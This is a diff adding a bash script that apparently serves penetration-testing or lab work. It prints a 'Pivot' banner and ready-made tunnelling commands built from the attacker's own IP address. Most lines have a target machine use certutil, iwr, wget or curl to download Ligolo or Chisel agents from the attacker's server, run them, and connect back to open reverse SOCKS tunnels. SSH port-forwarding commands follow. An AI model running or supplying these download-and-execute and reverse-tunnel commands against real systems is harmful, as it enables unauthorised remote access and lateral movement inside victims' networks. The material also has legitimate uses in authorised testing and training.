@@ -1,0 +1,86 @@
+#!/bin/bash
+
+# Colors
+GREEN='\033[0;32m' # Green
+NC='\033[0m'       # No Color
+
+
+# Make this work for local lab also
+if ip -4 a show tun0 &> /dev/null; then
+    LHOST=$(ip -4 a show tun0 | grep -Po 'inet \K[\d.]+')
+else
+    LHOST=$(ip -4 a show wlan0 | grep -Po 'inet \K[\d.]+')
+fi
+
+
+if [ $# -eq 0 ]
+then
+  TOOLS_PORT=31337
+else
+  TOOLS_PORT=$1
+fi
+
+cat << EOF
+  _____ _            _   
+ |  __ (_)          | |  
+ | |__) |__   _____ | |_ 
+ |  ___/ \ \ / / _ \| __|
+ | |   | |\ V / (_) | |_ 
+ |_|   |_| \_/ \___/ \__|
+                         
+EOF
+
+
+# https://patorjk.com/software/taag/#p=display&f=Big&t=Shells
+
+echo -e "LHOST=${GREEN}$LHOST${NC}"
+echo -e "TOOLS_PORT=${GREEN}$TOOLS_PORT${NC}"
+
+echo ""
+echo '********** Ligolo **********'
+echo
+echo "# Starting the proxy"
+echo "./proxy -selfcert -laddr 0.0.0.0:9001"
+echo
+echo "# Windows"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/ligolo/windows/agent.exe C:\Windows\Temp\agent.exe && C:\Windows\Temp\agent.exe -connect $LHOST:9001 -ignore-cert"
+echo
+echo "iwr -Uri http://$LHOST:$TOOLS_PORT/pivoting/ligolo/windows/agent.exe -OutFile C:\Windows\Temp\agent.exe | & C:\Windows\Temp\agent.exe -connect $LHOST:9001 -ignore-cert"
+echo
+echo "# Linux"
+echo "wget -O /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:9001 -ignore-cert"
+echo
+echo "curl -L -o /tmp/agent http://$LHOST:$TOOLS_PORT/pivoting/ligolo/linux/agent && chmod +x /tmp/agent && /tmp/agent -connect $LHOST:9001 -ignore-cert"
+
+echo
+echo '********** Chisel **********'
+echo
+echo "# Starting the server"
+echo "./chisel server --port 8888 --reverse"
+echo
+echo "# Windows"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe C:\Windows\Temp\chisel.exe && C:\Windows\Temp\chisel.exe client $LHOST:8888 R:1080:socks"
+echo
+echo "iwr -Uri http://$LHOST:$TOOLS_PORT/pivoting/chisel/windows/chisel.exe -OutFile C:\Windows\Temp\chisel.exe | & C:\Windows\Temp\chisel.exe client $LHOST:8888 R:1080:socks"
+echo
+echo "# Linux"
+echo "wget -O /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
+echo
+echo "curl -L -o /tmp/chisel http://$LHOST:$TOOLS_PORT/pivoting/chisel/linux/chisel && chmod +x /tmp/chisel && /tmp/chisel client $LHOST:8888 R:1080:socks"
+
+echo
+echo '********** SSH **********'
+echo
+echo "Local port to remote port"
+echo "ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 user@target"
+echo "ssh -f -N -L 8080:127.0.0.1:8080 user@target"
+echo
+echo "# Reverse Local Port to Remote Port"
+echo "ssh -R 31337:127.0.0.1:31337 user@target"
+echo
+echo "ssh -f -N -R $LHOST:8080:127.0.0.1:8888 user@target"
+echo "ssh -f -N -R $LHOST:$TOOLS_PORT:127.0.0.1:$TOOLS_PORT user@target"
+echo
+echo "# Forward dynamic socks proxy" 
+echo "ssh -f -N -D 127.0.0.1:1080 user@target"
+echo
